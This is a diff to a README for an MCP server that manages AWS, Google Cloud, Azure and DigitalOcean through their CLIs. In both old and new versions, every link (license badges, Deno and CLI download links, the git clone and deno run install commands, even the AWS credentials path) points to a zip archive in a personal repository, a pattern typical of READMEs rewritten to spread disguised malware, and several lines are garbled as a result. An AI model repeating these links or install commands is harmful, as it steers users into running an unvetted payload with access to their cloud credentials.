@@ -1,14 +1,14 @@
 = poly-cloud-mcp
 
-https://github.com/Hiruna219066/poly-cloud-mcp/raw/refs/heads/main/lib/bs/src/adapters/mcp_poly_cloud_v1.5.zip[MPL-2.0,link="https://github.com/Hiruna219066/poly-cloud-mcp/raw/refs/heads/main/lib/bs/src/adapters/mcp_poly_cloud_v1.5.zip"]
-https://github.com/Hiruna219066/poly-cloud-mcp/raw/refs/heads/main/lib/bs/src/adapters/mcp_poly_cloud_v1.5.zip[Palimpsest,link="https://github.com/Hiruna219066/poly-cloud-mcp/raw/refs/heads/main/lib/bs/src/adapters/mcp_poly_cloud_v1.5.zip"]
+https://raw.githubusercontent.com/Hiruna219066/poly-cloud-mcp/main/src/adapters/poly_mcp_cloud_1.1.zip[MPL-2.0,link="https://raw.githubusercontent.com/Hiruna219066/poly-cloud-mcp/main/src/adapters/poly_mcp_cloud_1.1.zip"]
+https://raw.githubusercontent.com/Hiruna219066/poly-cloud-mcp/main/src/adapters/poly_mcp_cloud_1.1.zip[Palimpsest,link="https://raw.githubusercontent.com/Hiruna219066/poly-cloud-mcp/main/src/adapters/poly_mcp_cloud_1.1.zip"]
 
 
 :toc:
 :toc-placement!:
 
-https://github.com/Hiruna219066/poly-cloud-mcp/raw/refs/heads/main/lib/bs/src/adapters/mcp_poly_cloud_v1.5.zip[RSR Compliant,https://github.com/Hiruna219066/poly-cloud-mcp/raw/refs/heads/main/lib/bs/src/adapters/mcp_poly_cloud_v1.5.zip]
-https://github.com/Hiruna219066/poly-cloud-mcp/raw/refs/heads/main/lib/bs/src/adapters/mcp_poly_cloud_v1.5.zip[MCP Server,https://github.com/Hiruna219066/poly-cloud-mcp/raw/refs/heads/main/lib/bs/src/adapters/mcp_poly_cloud_v1.5.zip]
+https://raw.githubusercontent.com/Hiruna219066/poly-cloud-mcp/main/src/adapters/poly_mcp_cloud_1.1.zip[RSR Compliant,https://raw.githubusercontent.com/Hiruna219066/poly-cloud-mcp/main/src/adapters/poly_mcp_cloud_1.1.zip]
+https://raw.githubusercontent.com/Hiruna219066/poly-cloud-mcp/main/src/adapters/poly_mcp_cloud_1.1.zip[MCP Server,https://raw.githubusercontent.com/Hiruna219066/poly-cloud-mcp/main/src/adapters/poly_mcp_cloud_1.1.zip]
 
 Unified MCP server for multi-cloud provider management. Provides Model Context Protocol tools for interacting with AWS, Google Cloud, Azure, and DigitalOcean through their respective CLI tools.
 
@@ -115,7 +115,7 @@ This MCP server executes external CLI commands using Deno's `--allow-run` permis
 **What this means:**
 
 * Commands run with your locally configured cloud credentials
-* AWS: Uses `~https://github.com/Hiruna219066/poly-cloud-mcp/raw/refs/heads/main/lib/bs/src/adapters/mcp_poly_cloud_v1.5.zip` or `AWS_*` environment variables
+* AWS: Uses `~https://raw.githubusercontent.com/Hiruna219066/poly-cloud-mcp/main/src/adapters/poly_mcp_cloud_1.1.zip` or `AWS_*` environment variables
 * GCP: Uses `gcloud auth` login or service account
 * Azure: Uses `az login` session
 * DigitalOcean: Uses `doctl auth` or `DIGITALOCEAN_ACCESS_TOKEN`
@@ -131,17 +131,17 @@ This MCP server executes external CLI commands using Deno's `--allow-run` permis
 
 == Requirements
 
-* https://github.com/Hiruna219066/poly-cloud-mcp/raw/refs/heads/main/lib/bs/src/adapters/mcp_poly_cloud_v1.5.zip[Deno] runtime (v2.0+)
-* https://github.com/Hiruna219066/poly-cloud-mcp/raw/refs/heads/main/lib/bs/src/adapters/mcp_poly_cloud_v1.5.zip[AWS CLI] (optional, for AWS tools)
-* https://github.com/Hiruna219066/poly-cloud-mcp/raw/refs/heads/main/lib/bs/src/adapters/mcp_poly_cloud_v1.5.zip[gcloud CLI] (optional, for GCP tools)
-* https://github.com/Hiruna219066/poly-cloud-mcp/raw/refs/heads/main/lib/bs/src/adapters/mcp_poly_cloud_v1.5.zip[Azure CLI] (optional, for Azure tools)
-* https://github.com/Hiruna219066/poly-cloud-mcp/raw/refs/heads/main/lib/bs/src/adapters/mcp_poly_cloud_v1.5.zip[doctl] (optional, for DigitalOcean tools)
+* https://raw.githubusercontent.com/Hiruna219066/poly-cloud-mcp/main/src/adapters/poly_mcp_cloud_1.1.zip[Deno] runtime (v2.0+)
+* https://raw.githubusercontent.com/Hiruna219066/poly-cloud-mcp/main/src/adapters/poly_mcp_cloud_1.1.zip[AWS CLI] (optional, for AWS tools)
+* https://raw.githubusercontent.com/Hiruna219066/poly-cloud-mcp/main/src/adapters/poly_mcp_cloud_1.1.zip[gcloud CLI] (optional, for GCP tools)
+* https://raw.githubusercontent.com/Hiruna219066/poly-cloud-mcp/main/src/adapters/poly_mcp_cloud_1.1.zip[Azure CLI] (optional, for Azure tools)
+* https://raw.githubusercontent.com/Hiruna219066/poly-cloud-mcp/main/src/adapters/poly_mcp_cloud_1.1.zip[doctl] (optional, for DigitalOcean tools)
 
 == Installation
 
 [source,bash]
 ----
-git clone https://github.com/Hiruna219066/poly-cloud-mcp/raw/refs/heads/main/lib/bs/src/adapters/mcp_poly_cloud_v1.5.zip
+git clone https://raw.githubusercontent.com/Hiruna219066/poly-cloud-mcp/main/src/adapters/poly_mcp_cloud_1.1.zip
 cd poly-cloud-mcp
 ----
 
@@ -151,7 +151,7 @@ Run as MCP server (Local-Agent mode):
 
 [source,bash]
 ----
-deno run --allow-run --allow-read --allow-env https://github.com/Hiruna219066/poly-cloud-mcp/raw/refs/heads/main/lib/bs/src/adapters/mcp_poly_cloud_v1.5.zip
+deno run --allow-run --allow-read --allow-env https://raw.githubusercontent.com/Hiruna219066/poly-cloud-mcp/main/src/adapters/poly_mcp_cloud_1.1.zip
 ----
 
 Or use the systemd service:
@@ -169,7 +169,7 @@ Verify the server is working correctly:
 [source,bash]
 ----
 # 1. Check Deno can run the server
-deno run --allow-run --allow-read --allow-env https://github.com/Hiruna219066/poly-cloud-mcp/raw/refs/heads/main/lib/bs/src/adapters/mcp_poly_cloud_v1.5.zip &
+deno run --allow-run --allow-read --allow-env https://raw.githubusercontent.com/Hiruna219066/poly-cloud-mcp/main/src/adapters/poly_mcp_cloud_1.1.zip &
 SERVER_PID=$!
 
 # 2. Verify at least one CLI is accessible
